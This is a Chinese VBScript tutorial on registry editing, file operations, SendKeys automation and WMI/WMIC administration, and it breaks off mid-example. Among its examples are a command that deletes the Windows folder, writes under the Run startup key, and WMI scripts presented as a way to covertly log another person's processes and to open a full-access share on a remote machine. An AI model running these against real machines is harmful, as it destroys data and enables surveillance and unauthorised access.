(1)REG_SZ:字符型,该类型为缺省类型
(2)REG_DWORD:双字节型
(3)REG_BINARY:二进制型

以上三种类型第1种和第2种用得最多,第3种类型在某些场合可以用第2种加以替代,这三种类型的赋值方法如下:
对于REG_SZ型:直接用字符串赋予,如"text","string"等
对于REG_DWORD型和REG_BINARY型则有两种赋值方式:直接用十进制的数表示如0,1等;用十六进制的数表示如0x12,0xff等

</pre><textarea>Dim OperationRegistry
Set OperationRegistry=WScript.CreateObject("WScript.Shell")
Default=OperationRegistry.RegRead("HKCR\")
'获取一个空值 (null)
　
OperationRegistry.RegWrite "HKCR\.xxf\",Default
'在根键HKEY_CLASSES_ROOT之下新建主键.xxf,并置其默认值为空
　
OperationRegistry.RegWrite "HKCR\.xxf\","xxffile"
'在根键HKEY_CLASSES_ROOT之下新建主键.xxf,并置其默认值?quot;xxffile"
　
OperationRegistry.RegWrite "HKCR\.xxf\value1","string"
'在主键.xxf之下新建一个字符串型键值value1,并置其初始值为"string"
　
OperationRegistry.RegWrite "HKCR\.xxf\value2",1,"REG_DWORD"
'在主键.xxf之下新建一个REG_DWORD型键值value2,并置其初始值为1
　
OperationRegistry.RegWrite "HKCR\.xxf\value3",0Xff,"REG_BINARY"
'在主键.xxf之下新建一个二进制型键值value3,并置其初始值为十六进制的ff

'创建一个新的关键词
path="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run\sssa2000\love\"
set ws=wscript.createobject("wscript.shell")
val=ws.regwrite(path,"nenboy")
val=ws.regread(path)
wscript.echo val

'把HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\jj这个键值改成了hello,不过要这个键值一定要预先存在
path="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"
set ws=wscript.createobject("wscript.shell")
t=ws.regwrite(path & "jj","hello")

</textarea><pre>
3、RegDelete操作
删除操作RegDelete主要是用来删除注册表中已存在的主键或键值,该操作是一种极危险的操作,它能将主键或键值毫不留情的在注册表中删除
删除操作的参数形式与读操作的参数形式几乎完全相同,只有一点小小的区别就是删除操作不需要将操作的返回值送给某一变量

Dim OperationRegistry
Set OperationRegistry=WScript.CreateObject("WScript.Shell")
OperationRegistry.RegDelete("HKCR\.xxf\value")
'删除.xxf主键之下的value键值
OperationRegistry.RegDelete("HKCR\.xxf\")
'删除根键HKEY_CLASSES_ROOT之下的.xxf主键

防范VBS病毒可以选择将WSH卸载,只要打开控制面板找到“添加/删除程序”,点选“Windows安装程序”,再鼠标双击其中的“附件”一项,然后再在打开的窗口中将“Windows Scripting Host”一项的“√”去掉,然后连续点两次“确定”就可以将WSH卸载。
也可以点击“我的电脑”→“查看”→“文件夹选项”,在弹出的对话框中点击“文件类型”,然后删除VBS、VBE、JS、JSE文件后缀名与应用程序的映射都可以达到防范VBS脚本病毒的目的。

【 FSO的常见对象和方法 】
文件系统是所有操作系统最重要的部分之一,脚本经常会需要对文件及文件夹进行访问和管理,在Vbs中对桌面和文件系统进行访问的顶级对象是FileSystemObject(FSO),这个对象特别复杂,是vbs进行文件操作的核心

FSO包含的常见对象
Drive对象:包含储存设备的信息,包括硬盘、光驱、ram盘、网络驱动器
Drives集合:提供一个物理和逻辑驱动器的列表
File对象:检查和处理文件
Files集合:提供一个文件夹中的文件列表
Folder对象:检查和处理文件夹
Folders集合:提供文件夹中子文件夹的列表
Textstream对象:读写文本文件

FSO的常见方法
BulidPath:把文件路径信息添加到现有的文件路径上
CopyFile:复制文件
CopyFolder:复制文件夹
CreateFolder:创建文件夹
CreateTextFile:创建文本并返回一个TextStream对象
DeleteFile:删除文件
DeleteFolder:删除文件夹及其中所有内容
DriveExits:确定驱动器是否存在
FileExits:确定一个文件是否存在
FolderExists:确定某文件夹是否存在
GetAbsolutePathName:返回一个文件夹或文件的绝对路径
GetBaseName:返回一个文件或文件夹的基本路径
GetDrive:返回一个dreve对象
GetDriveName:返回一个驱动器的名字
GetExtensionName:返回扩展名
GetFile:返回一个file对象
GetFileName:返回文件夹中文件名称
GetFolder:返回一个文件夹对象
GetParentFolderName:返回一个文件夹的父文件夹
GetSpecialFolder:返回指向一个特殊文件夹的对象指针
GetTempName:返回一个可以被createtextfile使用的随机产生的文件或文件夹的名称
MoveFile:移动文件
MoveFolder:移动文件夹
OpenTextFile:打开一个存在的文件并返回一个TextStream对象

FSO中文件夹的基本操作

1、使用fso
由于fso不是wsh的一部分,所以需要建立他的模型
例如set fs=wscript.createobject("scripting.filesystemobject")
这样就建立了fso的模型。如果要释放的话也很简单,set fs=nothing

2、使用文件夹
在创建前一般需要检查该文件夹是否存在

dim fs,s //定义fs、s两个变量
set fs=wscript.createobject("scripting.filesystemobject") //fs为FSO实例
if (fs.folderexists("c:\temp")) then //判断c:\temp文件夹是否存在
s="is available"
else
s="not exist"
set foldr=fs.createfolder("c:\temp") //不存在则建立
end if

删除:
set fs=wscript.createobject("scripting.filesystemobject")
fs.deletefolder("c:\windows")

拷贝
set fs=wscript.createobject("scripting.filesystemobject")
fs.copyfolder "c:\data" "d:\data"
如果c:\data 和d:\data都存在,脚本会出错,复制也就会停止,如果要强制覆盖使用fs.copyfolder "c:\data" "d:\data",true

移动:
set fs=wscript.createobject("scripting.filesystemobject")
fs.movefolder "c:\data" "d:\data"

可以使用通配符来方便操作:
fs.movefolder :c:\data\te*" , "d:\working"
在目的路径最后没有使用"\" 也就是说没有这样写:
fs.movefolder c:\data\te*" , "d:\working\"
这样写的话,如果d:\working目录不存在,windows就不会自动创建这个目录。

上面的例子都是在利用fso提供的方法,如果使用folder对象也完全是可以的:
set fs= wscript.createobject("scripting.filesystemobject")
set f=fs.getfolder("c:\data")
f.delete  //删除文件夹c:\data。如果有子目录,也会被删除
f.copy "d:\working",true    //拷贝到d:\working
f.move "d:\temp"    //移动到d:\temp

3、特殊文件夹
一般指的就是系统文件夹:\windows\system32, 临时文件夹,windows文件夹

set fs=wscript.createobject("scripting.filesystemobject")
set wshshell=wscript.createobject("wscript.shell")
osdir=wshshell.expandenvironmentstrings("%systemroot%")
set f=fs.getfolder(osdir)
wscript.echo f

当然,还有简单的方法 那就是使用getspecialfolder()
这个方法使用3种值:
0  表示windows文件夹,相关常量是windowsfolder
1  系统文件夹,相关常量是systemfolder
2  临时目录,相关常量temporaryfolder

set fs=wscript.createobject("scripting.filesystemobject")
set wfolder=fs.getspecialfolder(0) '返回windows目录
set wfolder=fs.getspecialfolder(1) '返回system32\
set wfolder=fs.getspecialfolder(2)'返回临时目录

【 FSO中文件的基本操作 】
一、文件属性:
在windows中文件的属性一般用数字来表示:
0代表normal,即普通文件未设置任何属性。
1代表只读文件。
2代表隐藏文件。
4代表系统文件。
16代表文件夹或目录。
32代表存档文件。
1024代表链接或快捷方式

set fs=wscript.createobject("scripting.filesystemobject")
set f=fs.getfile("d:\index.txt")
msgbox f.Attributes  'attributes函数的作用是显示文件属性,msgbox显示的结果往往不是上面说明的数字,而是有关属性代表数字的和

二、创建文件:object.createtextfile方法,创建前一般需要检查文件是否存在,如需要强制覆盖已存在的文件则在文件名后加true参数
set fso=wscript.createobject("scripting.filesystemobject")
if fso.fileexists("c:\kk.txt") then
msgbox "文件已存在"
else
set f=fso.createtextfile("c:\kk.txt")
end if

三、复制、移动、删除文件:使用copyfile方法、movefile方法、deletefile方法
set fso=wscript.createobject("scripting.filesystemobject")
fso.copyfile "c:\kk.txt","d:\1\kk.txt",true //如上文说述,true代表强制覆盖
fso.movefile "c:\kk.txt", "d:\" //移动文件
fso.deletefile "c:\kk.txt" //删除文件

四、文件的读写:
1、打开文件:使用opentextfile方法,第二个参数为访问模式1为只读、2写入、8为追加,第三个参数指定如文件不存在则创建
set ts=fso.opentextfile("c:\kk.txt",1,true)

2、读取文件:read(x)读x个字符;readline读一行;readall全部读取
set ffile=fso.opentextfile("c:\kk.txt",1,true)
value=ffile.read(20)
line=ffile.readline
contents=ffile.readall

3、常见的指针变量:
atendofstream属性:当处于文件结尾的时候这个属性返回true,一般用循环检测是否到达文件末尾
atendofline属性:如果已经到了行末尾,这个属性返回true。
Column属性(当前字符位置的列号)和line属性(文件当前行号):在打开一个文件后行和列指针都被设置为1。

do while ffile.atendofstream<>true
ffile.read(10)
loop

4、在文件中跳行
skip(x)  跳过x个字符
skipline  跳过一行

5、在文件中写入字符:可以用2－写入和8－追加的方式来写入
其方法有:
write(x)写入x字符串
writeline(x)写入x代表的一行
writeblanklines(n) 写入n个空行

最后一定要使用close方法关闭文件,读文件后一定要关闭才能以写的方式打开。

【 妙用SendKeys简化重复操作 】
每次开机时想自动登陆QQ或博客,巧妙使用VBS中的SendKeys命令可以极大的方便常用操作,这个命令的作用就是模拟键盘操作,将一个或多个按键指令发送到指定Windows窗口来控制应用程序运行

格式:
Object.SendKeys string
Object:为WshShell对象,即脚本的第一行为:Set WshShell=WScript.CreateObject("WScript.Shell"),将Object替换为WshShell
"string":表示要发送的按键指令字符串,需要放在英文双引号中,它包含如下内容:

1．基本键:一般要发送的按键指令都可以直接用该按键字符本身来表示,例如要发送字母"x",使用"WshShell.SendKeys "x""即可
也可直接发送多个按键指令,只需要将按键字符按顺序排列在一起即可,例如要发送按键"cfan",可以使用"WshShell.SendKeys "cfan""。

2．特殊功能键:对于需要与Shift、Ctrl、Alt三个控制键组合的按键,SendKeys使用特殊字符来表示:
Shift   ——   +
Ctrl   ——   ^
Alt   ——   %
如要发送的组合按键是同时按下Ctrl＋E,需要用"WshShell.SendKeys "^e""表示,
如果要发送的组合按键是按住Ctrl键的同时按下E与C两个键,这时应使用小括号把字母键括起来,格式为"WshShell.SendKeys "^(ec)"",
"WshShell.SendKeys "^ec""表示组合按键是同时按住Ctrl和E键,然后松开Ctrl键,单独按下"C"字母键。

"+"、"^"这些字符用来表示特殊的控制按键了,表示这些按键只要用大括号括住这些字符即可,如发送加号"+"可使用"WshShell.SendKeys "{+}""
对于一些不会生成字符的控制功能按键,也同样需要使用大括号括起来按键的名称,如发送回车键需要用"WshShell.SendKeys "{ENTER}""表示,发送向下的方向键用"WshShell.SendKeys "{DOWN}""表示。

如果需要发送多个重复的单字母按键,不必重复输入该字母,SendKeys允许使用简化格式进行描述,使用格式为"{按键 数字}"。例如要发送10个字母"x"则输入"WshShell.SendKeys "{x 10}""即可。

例一:WshShell.SendKeys "^{ESC}u"
按下Ctrl＋Esc组合键(相当于按Win键)打开"开始"菜单,接着按U键打开"关机"菜单。

例二:让VBS脚本自动在记事本中输入一行文字"hello, welcome to cfan"。
Dim WshShell
Set WshShell=WScript.CreateObject("WScript.Shell")
WshShell.Run "notepad"
WScript.Sleep 2000   // 脚本暂停2秒,给notepad一个打开的时间,有时时间太短可能导致后面的字符无法进入编辑区
WshShell.AppActivate "无标题 - 记事本" // AppActivate为寻找可执行程序的标题框,"无标题－记事本"内容你的自己打开看一下
WshShell.SendKeys "hello, welcome to cfan"

例三:制作能自动定时存盘的记事本
记事本没有Word、WPS那样的自动定时存盘功能,其实利用VBS脚本再加上SendKeys命令就能弥补这个遗憾

'第一部分:定义变量和对象
Dim WshShell, AutoSaveTime, TXTFileName
AutoSaveTime=300000
Set WshShell=WScript.CreateObject("WScript.Shell")
TXTFileName=InputBox("请输入你要创建的文件名(不能用中文和纯数字):")
'第二部分:打开并激活记事本
WshShell.Run "notepad"
WScript.Sleep 200
WshShell.AppActivate "无标题 - 记事本"
'第三部分:用输入的文件名存盘
WshShell.SendKeys "^s"
WScript.Sleep 300
WshShell.SendKeys TXTFileName
WScript.Sleep 300
WshShell.SendKeys "%s"
WScript.Sleep AutoSaveTime
'第四部分:自动定时存盘
While WshShell.AppActivate (TXTFileName)=True
WshShell.SendKeys "^s"
WScript.Sleep AutoSaveTime
Wend
WScript.Quit

将其保存为记事本.vbs,以后要使用记事本时都通过双击这个脚本文件来打开。

程序说明
这个脚本的基本思路是定时向记事本发送Ctrl＋S这个存盘组合键。

第一部分:定义了脚本中需要用到的变量和对象。"AutoSaveTime"变量用来设置自动存盘间隔,单位为毫秒,这里设置为5分钟。"TXTFileName"变量通过输入框取得要创建的文本文件名称。

第二部分:运行记事本,对于Windows本身提供的程序比如计算器等,可直接在"WshShell.Run"后输入程序名称如"calc",对于非系统程序则可输入完全路径,但要注意使用8.3格式输入比如""D:\Progra~1\Tencent\QQ.exe""。

第三部分:这里用SendKeys命令执行了这样的操作流程:在记事本中按Ctrl＋S组合键→弹出保存文件的窗口→输入文件名→按Alt＋S组合键进行保存,默认保存在"我的文档"目录

第四部分:定时存盘的关键,通过"While……Wend"这个当条件为"真"时循环命令,实现自动存盘代码"WshShell.SendKeys "^s""和定时代码"WScript.Sleep AutoSaveTime"的重复执行。因为不能让这个定时存盘循环一直执行,退出记事本后必须自动退出脚本并结束循环,所以设计了一个循环判断条件"WshShell.AppActivate TXTFileName=True",当记事本运行中时可以激活记事本窗口,这个条件运行结果为"True",定时存盘循环一直执行,退出记事本后,脚本无法激活记事本窗口,就会跳出循环,执行"Wend"后面的"WScript.Quit"退出脚本。

例四:快速登陆QQ软件。假设QQ号码是:10001,密码是:123456,隐身登陆:
set ws=wscript.createobject("wscript.shell")
ws.run "C:\Progra~1\Tencent\QQ\QQ.exe",0
wscript.Sleep 2000
ws.AppActivate "QQ用户登录"
ws.SendKeys "7015247"
wscript.Sleep 200
ws.SendKeys "{TAB}"
ws.SendKeys "*********"
wscript.Sleep 200
ws.SendKeys "{ENTER}"

例五:关机菜单立刻显身
打开记事本,输入以下命令,并将其保存为1.vbs:
set WshShell = CreateObject("WScript.Shell")
WshShell.SendKeys "^{ESC}u"
双击运行它关机菜单立刻出现了。
将"WshShell.SendKeys "^{ESC}u""改为"WshShell.SendKeys "^+{ESC}"",运行一下看看是否打开了任务管理器

妙用SendKeys自动上网并登陆博客3
将下面的脚本复制到一个文本文件中,并将其文件名命名为自动登陆.vbs,然后将拨号软件及本脚本一起复制到程序——启动项中就可以实现自动拨号上网并登陆到博客上。

Set wshshell=CreateObject("wscript.shell")
wshshell.AppActivate "连接 MAE-301U 拨号连接"
wscript.Sleep 20000
wshshell.SendKeys "{enter}"
wshshell.Run "iexplore"
WScript.Sleep 2000
wshshell.AppActivate "hao123网址之家---实用网址,搜索大全,尽在http://www.hao123.com/ - Microsoft Internet Explorer" '引号中的内容修改为你的浏览器打开后标题栏中的内容
wshshell.SendKeys "%d"
wshshell.SendKeys "http://passport.baidu.com/?login"
wshshell.SendKeys "{enter}"
WScript.Sleep 2000
wshshell.SendKeys "此处修改为博客帐号"
wshshell.SendKeys "{tab}"
wshshell.SendKeys "此处修改为博客密码"
wshshell.SendKeys "{enter}"
'wshshell.SendKeys "%d"

Vbs脚本常用的编辑器是notapad,不过功能实在太弱了,其实有很多的专用的脚本编辑器可以大大方便vbs脚本的编写,常用的有两种:
1、VBSEDit汉化版
2、primalscript汉化版,可以对30多种脚本进行编辑

【 使用系统对话框 】
在VBS脚本设计中,如果能使用windows提供的系统对话框,可以简化脚本的使用难度,使脚本人性化许多,很少有人使用,但VBS并非不能实现这样的功能,方法当然还是利用COM对象。

1、SAFRCFileDlg.FileSave对象:属性有:FileName — 指定默认文件名;FileType — 指定文件扩展名;OpenFileSaveDlg — 显示文件保存框体方法。
2、SAFRCFileDlg.FileOpen对象:FileName — 默认文件名属性;OpenFileOpenDlg — 显示打开文件框体方法。
3、UserAccounts.CommonDialog对象:Filter — 扩展名属性("vbs File|*.vbs|All Files|*.*");
FilterIndex — 指定
InitialDir — 指定默认的文件夹
FileName — 指定的文件名
Flags — 对话框的类型
Showopen方法:

例一:保存文件
Set objDialog = CreateObject("SAFRCFileDlg.FileSave")
Set objFSO = CreateObject("Scripting.FileSystemObject")
objDialog.FileName = "test"
objDialog.FileType = ".txt"
intReturn = objDialog.OpenFileSaveDlg
If intReturn Then
objFSO.CreateTextFile(objDialog.FileName & objdialog.filetype)
Else
Wscript.Quit
End If

1、SAFRCFileDlg.FileSave对象仅仅是提供了一个方便用户选择的界面,本身并没有保存文件的功能,保存文件还需要使用FSO对象来完成。
2、用FileType属性来指定默认的文件类型。
3、在调用OpenFileSaveDlg方法时最好把返回值保存到一变量中,用它可以判断用户按下的是确定还是取消。

例二:.打开文件
set objFile = CreateObject("SAFRCFileDlg.FileOpen")
intRet = objFile.OpenFileOpenDlg
if intret then
msgbox "文件打开成功！文件名为:" & objFile.filename
else
wscript.quit
end if

例三:比较复杂的打开文件对话框
Set objDialog = CreateObject("UserAccounts.CommonDialog")
objDialog.Filter = "vbs File|*.vbs"
objDialog.InitialDir = "c:\"
tfile=objDialog.ShowOpen
if tfile then
strLoadFile = objDialog.FileName
msgbox strLoadFile
else
wscript.quit
end if
说明:在脚本中加入 objDialog.Flags = &H020 看看会出现什么结果

【 WMI基础 】
Microsoft Windows Management Instrumentation (WMI)即Windows管理规范,是用户管理本地和远程计算机的一种模型,通过它可以访问、配置、管理和监视几乎所有的Windows资源。
从Windows2000开始,WMI就内置于操作系统中,并且成为了Windows系统管理的重要组成部分

WMI的语法十分简单,基本上常见的命名空间、对象等用几乎一模一样,它对应的是Windows里的WMI服务(winmgmt)

WMI能做什么？
WMI不仅可以获取想要的计算机数据,而且还可以用于远程控制。远程控制计算机可是大家都喜欢的东西。很多远程监视控制类软件通常的做法是:在远程计算机上运行服务端后台程序,在本地计算机上运行一个客户器端控制程序,通过这二个程序的勾结来实现对计算机的远程控制。这种作法的缺点是十分明显的,当服务端程序关了,这种远程监控就无法实现了,因为没有内线了。而WMI实现的远程监视和控制完全不需要另外装什么服务端的东西,系统默认就将WMI服务给开了。具体说来WMI的本领如下:
1．获取本地和远程计算机的硬件软件信息。
2．监视本地和远程计算机的软件和服务等运行状况。
3．控制本地和远程计算机的软件和服务运行。
4．高级应用。

如何访问WMI？
利用WMI有许多途径,简单说来有三种:
1．通过微软提供的各种工具来实现普通查询和操作,主要包括WMI TOOL(可以到微软的网站上免费下载)和命令提示符下面的WMIC
2．通过自己编写脚本来实现更灵活操作
3. 通过编写程序来访问并操作它,什么语言都,如果用.NET类程序要简单些了,如果用VC等要复杂些了
4．C:\WINDOWS\system32\wbem目录中的东西都和它有密切联系,有日志和各种工具

利用WMIC来认识WMI
WMIC(Windows Management Instrumentation Commandline)扩展WMI,提供了从命令行接口和批命令脚本执行系统管理的支持,为WMI名称空间提供了一个强大的、友好的命令行接口。有了WMIC,WMI就显的平易近人了。

执行"WMIC"命令将启动WMIC命令行环境,第一次执行WMIC命令时Windows首先要安装WMIC,然后显示出WMIC的命令行提示符,在WMIC命令行提示符上命令将以交互的方式执行,"/?"命令显示帮助文档。
WMIC也可以按照非交互的模式运行。如果要执行某个单步的任务或运行批命令中的一系列WMIC命令,非交互模式就很有用。要使用非交互模式,只要在同一个命令行上启动WMIC并输入要执行的命令就可以了

任务一:利用WMIC列出远程计算机上的所有进程
cmd> WMIC /node:192.168.1.2 /user:net process
WMIC /node:192.168.1.2 /user:net /password:password process

命令中的NODE、PASSWORD和USER是全局开关,这里的用户名和密码都必须是管理员级别的,其它的无效。WMIC提供了大量的全局开关、别名、动词、命令和丰富的命令行帮助增强用户接口。全局开关是用来配置整个WMIC会话的选项。
Process是个别名,执行了一个Win32_process类的WQL查询,别名是用户和WMI名称空间一个简化语法的中间层。指定一个别名时动词(Verb)表示要执行的动作。
可以在该后面加上个动词等,比如 LIST FULL等
安装了WMIC的机器可以连接到任何一台安装了WMI的机器,被连接的机器不需要安装WMIC。

任务二:利用WMIC关闭本地进程QQ,用交互式的方法来执行任务
WMIC
process where name="qq.exe" call terminate

任务三:通过WMIC把远程主机的进程信息保存在一个网页中
除了文本形式的输出之外,WMIC还能够以其他形式返回命令执行结果,例如XML、HTML或CSV(逗号分隔的文本文件)
wmic /output:C:\1.html /node:192.168.1.2 /user:net process list full /format:hform.xsl
输入密码 :******
1)全局开关OUTPUT指明将这些信息保存在什么地方。
2)全局开关FORMAT指明了用什么样的格式,可以参看C:\WINDOWS\system32\wbem目录中的*.xsl文件那些格式可以用

利用脚本来认识WMI
用脚本来实现任务功能将更加强大,操作将更加灵活。
无论脚本还是真正意义上的程序,要检索WMI托管资源信息进而查询并利用WMI都需要遵循以下三个步骤
1．连接到WMI服务,建立一个到目标计算机上的Windows管理服务的连接。
2．检索WMI托管资源的实例,主要取决于要执行的任务。
3．显示WMI某实例属性和调用其方法。

利用脚本实时监视对方进程
每当对方开一个任务本机就察觉到,并把它记录下来,要在他开进程的那一秒开始报告并记录,要清楚他所开的程序所在的位置等信息

首先连接到对方的WMI
首先调用VBScript的中的Createobject()得到一个对象,然后利用这个特殊的对象的方法来连接到远程的计算机上。这个特殊的对象就是wbemscripting.swbemlocator。

set olct=createobject("wbemscripting.swbemlocator")
set wbemServices=olct.connectserver(strComputer,"root\cimv2",strUser,strPwd)

strComputer是要连接的计算机的名称或IP地址,strUser,strPwd就是用户名和密码了,这个用户必须是具有管理员权限的才可以。root\cimv2是WMI的命名空间。用这种方法连接到WMI返回一个对SWbemServices对象的引用,一旦有一个对SWbemServices对象的引用。就可以进行第二个步骤了。

在第二个步骤中将得到WMI托管资源的实例,利用WbemServices中的一个方法ExecNotificationQuery可以查询所要的类,进而可以得到该类中实例。

Set colMonitoredProcesses = wbemServices. _
ExecNotificationQuery("select * from __instancecreationevent " _
& " within 1 where TargetInstance isa 'Win32_Process'")

WQL语言是类似于SQL语言的查询语言,得到的colMonitoredProcesses是所查询的类的实例的集合,有了这些第三个步骤就可以开始了

在第三个步骤中将显示出得到的实例中的属性
刚得到的是实例的集合,这里通过colMonitoredProcesses.NextEvent获取每一个具体的实例,得到每一个具体的实例后就可以显示出他们的属性,也就是我们想看的东西了,这里显示了CommandLine的属性值。

到底WMI里面有那些类,具体类又有哪些属性,用一些工具可以很轻松的得到这些信息,比如系统自带的wbemtest,在运行中敲入这个程序名就可以看到这些了,它也遵循连接、查询、枚举这三个步骤。WMI太大了,单是命名空间就有10多个,然后单是常用的空间root\CIMV2里面就有近1000个类,每个类里面又有好多的属性,有些类还有好多方法,其实你只需要知道其中的一些就好了。

完整代码
Set colArgs = WScript.Arguments
If WScript.arguments.count < 3 then
WScript.Echo "USAGE:" & vbCrLf & " Monitor Computer User Password files"
WScript.quit
End If
strComputer = wscript.arguments(0)
strUser = wscript.arguments(1)
strPwd = wscript.arguments(2)
strFile = wscript.arguments(3)
set olct=createobject("wbemscripting.swbemlocator")
set wbemServices=olct.connectserver(strComputer,"root\cimv2",strUser,strPwd)
Set colMonitoredProcesses = wbemServices. _
ExecNotificationQuery("select * from __instancecreationevent " _
& " within 1 where TargetInstance isa 'Win32_Process'")
i = 0
Do While i = 0
Set objLatestProcess = colMonitoredProcesses.NextEvent
Wscript.Echo now & " " & objLatestProcess.TargetInstance.CommandLine
Set objFS = CreateObject("Scripting.FileSystemObject")
Set objNewFile = objFS.OpenTextFile(strFile,8,true)
objNewFile.WriteLine Now() & " " & objLatestProcess.TargetInstance.CommandLine
objNewFile.Close
Loop

保存为monitor.vbs的文件,然后在命令提示符下输入:
CSCRIPT monitor.vbs
回车就会看到帮助,下面举例说明这个脚本的具体用法:
CSCRIPT monitor.vbs 192.168.1.2 user password C:\1.txt
在命令提示符下敲入上面的命令就OK了,每当对方开一个程序的时候就可以看到时间,程序路径和程序名,还可以到C:\1.txt看到这些信息。

每次使用脚本都必须敲入CSCRIPT和脚本的后缀名,这是因为系统默认的执行引擎是WSCRIPT,可以将它改成CSCRIPT
脚本执行后总要显示微软的说明,可以通过在命令提示符下敲入下面的命令来解决这个问题:
cscript //nologo //h:cscript //s
这样你以后再运行这些脚本的时候就不用在敲入CSCRIPT了,也不用在写入.vbs的后缀名了
monitor 192.168.1.2 user password C:\1.txt

解释:
1)前面的那几行,大概就是为了显示帮助和处理在后面输入的参数。应用到了WScript.Arguments对象来获取并处理脚本的参数。
2)那个死循环是为了让我们一直监视他(她),每当他开一个程序,我们就得到一个新的实例,我们就可以知道他更多的信息。这个脚本运行后只有通过我们人为中止才能中断监视,可以用CTRL+C来完成,也可以用各种方法来中止。
3)代码中另外一个核心对象FileSystemObject是为了将结果同时保存到一个文件中,利用它来创建或打开一个文件,将信息追加进去
4)至于那个NOW,虽然体积很小,但是却正是它给我们提供了时间这个重要的信息。
5)如果想要监视的是自己的计算机而不是远程的计算机,将计算机名的参数写为一个小点,用户名和密码留为空
monitor . "" "" C:\1.txt

利用脚本给对方开放共享
Set colArgs = WScript.Arguments
If WScript.arguments.count < 5 then
WScript.Echo "USAGE:" & vbCrLf & " Rshare Computer User Password SharePath ShareName"
WScript.quit
End If
strComputer = wscript.arguments(0)
strUser = wscript.arguments(1)
strPwd = wscript.arguments(2)
strPath = wscript.arguments(3)
strShareName = wscript.arguments(4)
intMaximumAllowed = 1
strDescription = "Temporary share"
Const SHARED_FOLDER = 0
set olct=createobject("wbemscripting.swbemlocator")
set wbemServices=olct.connectserver(strComputer,"root\cimv2",strUser,strPwd)
Set objSWbemObject = wbemServices.Get("Win32_Share")
intReturnvalue = objSWbemObject.Create(strPath, _
strShareName, _
SHARED_FOLDER, _
intMaximumAllowed, _
strDescription)
if(intReturnvalue = 0) Then
WScript.Echo "The share have been created successfully"
End If

解说:
1)前面的那几行是为显示帮助和处理输入参数而存在的。
2)紧接着设置了几个变量,为以后做参数用的
3)连接到主机的WMI,然后就是查询
4)这次得到实例集后用了它的一个方法,也就是这个方法让共享成为了可能,第一个参数表示要共享的路径和文件名,第二个参数表示共享名,第三个参数为0就可以了,第四个参数是指可以连接的人数,第五个参数是共享描述了,只关心前面的两个参数
5)这次根据第四步的返回值来得到共享是否成功,并给出提示。不同的返回值代表不同的意义,比如0代表成功返回,2代表拒绝访问,9代表用户名错误,25代表主机名没有找到等等。
6)用这个脚本来实现远程文件共享,要求远程存在这个文件,否则无法共享。当然也可以创建自己的文件夹
7)如上脚本创建后的共享是完全共享,就是可以删除修改文件的。
8)用法举例:share netp net swswsw C:\dodo marsh

一、WMI的起源
几年前几家资深的计算机公司由于系统管理领域缺少标准,委托DMTF启动了CIM(通用信息模型)项目,理想的CIM是一种不受限制于任何特定实现环境的管理工具。WMI是CIM的微软实现,它有很多类是从CIM中派生出来的。

二、WMI的命名空间
在同一段代码中如果有两个变量或函数的名字完全相同就会出现冲突,命名空间就是为解决变量、函数的命名冲突而服务的,解决的办法就是将变量定义在一个不同名字的命名空间中

WMI的命名空间创建了一个层次结构,有点类似于目录文件结构。
1、root-作为所有其他名字的占位符;
2、root\default-与注册表操作有关的类;
3、root\security-与系统安全有关的类;
4、root\cimv2-从CIM派生的类,代表最常用的工作环境。

三、WMI的对象路径
WMI的对象路径用来在CIM库中定位类和它的实例,对象路径用两个反斜杠\\开头,第一个元素是目标计算机的名字,第二个元素是相应的WMI命名空间,第三个元素是相应的类名,并用:将它与命名空间分隔开来,例如:\\..\root\cimv2:win32_service,其中那个 . 代表是本地系统。

四、WMI的查询语言WQL仅仅是ANSI SQL的一个子集,只能用于数据的提取。
数据、事件查询的基本语法为:
Select pro1 , pro2 , pro3  from myclass(myclassevent)
例如:Select name , path from Win32_share  说明:列出所有共享的名称和路径

也可以使用通配符 * ,例如:Select * from Win32_share
关键字Where用于限定查询的范围,例如:Select * from Win32_share where name="Admin"

五、WMI脚本中使用的三个步骤
步骤1:连接到WMI服务
在任何WMI脚本中,第一个步骤都是建立一个到目标计算机上的Windows管理服务的连接,方法是调用VBScript的Getobject函数并将WMI脚本库的名字对象的名称(即"winmgmts:",后跟目标计算机的名称)传递到Getobject,并返回一个对象的引用,此时就可以调用其提供的方法如:InstancesOf,InstancesOf返回由资源的类名标识的托管资源的所有实例。

步骤2:检索WMI托管资源的实例,一般采用WQL来实现。

步骤3:显示WMI托管资源的属性
最后一个步骤是枚举检索得到集合的内容,一般采用
For each enum in  myclass
……
Next
结构来实现。

六、WMI测试器(wbemtest.exe)验证脚本执行结果
现在对可用于浏览和查看CIM的工具已经有了一些认识,使用WMI测试器(wbemtest.exe)来检查Win32_Process类定义,以便从在您的本地计算机上运行的进程检索一些属性。

1.命令提示键入C:\>wbemtest.exe,按下Enter来开始WMI测试器工具,大部分按钮在主WMI测试器窗口上是被禁用的,这说明此时没有连接到WMI

2.单击"连接"按钮连接到本地或远程计算机上的WMI服务。显示"连接"对话框,它提供一个标记为名称空间的文本输入区域,该区域默认值为root\default。将名称空间区域的值更改为root\cimv2,单击"连接"对话框的连接按钮返回到主WMI测试器窗口。

3.主窗口中左上角的命名空间标识符应该显示为root\cimv2。所有的按钮现在都已启用,这说明在当前凭据环境下已经成功连接到本地主机上的WMI。单击枚举类别打开"超类信息"对话框。

4.在"超类信息"对话框中不要填写输入超类别名称区域,单击递归选项,单击确定以枚举root\cimv2名称空间中定义的所有CIM类。
列于"查询结果"对话框顶部的类是以两个下划线为开头的。这些是系统类。系统类是预定义的CIM类,支持内部WMI配置与操作,例如提供程序注册、命名空间安全性及事件通知等。现在忽略系统类,向下滚动"查询结果"对话框直至看到以CIM_开头的类。名称以CIM_开头的类是由DMTF维护的核心与公共基类。继续向下滚动直至到达以Win32_开头的类。名称以Win32_开头的类是Microsoft扩展类,表示Windows特定的托管资源。如果这是您第一次检查root\cimv2命名空间,您可能希望熟悉root\cimv2命名空间中的类的完整集合,尤其是有Win32_前缀的类。

5.向下滚动"查询结果"对话框直至到达Win32_Process类,双击该类名打开Win32_Process对话框的对象编辑器。

6."对象编辑器"对话框显示被选定类的定义和实现的详细信息(属性和方法)。选择Hide System Properties复选框隐藏系统属性。剩余的Win32_Process属性表示您可以从在本地或远程计算机上运行的进程检索的信息。

运行如下代码:
strComputer = "."
Set wbemServices = Getobject("winmgmts:\\" & strComputer)
Set wbemObjectSet = wbemServices.InstancesOf("Win32_Process")
For Each wbemObject In wbemObjectSet
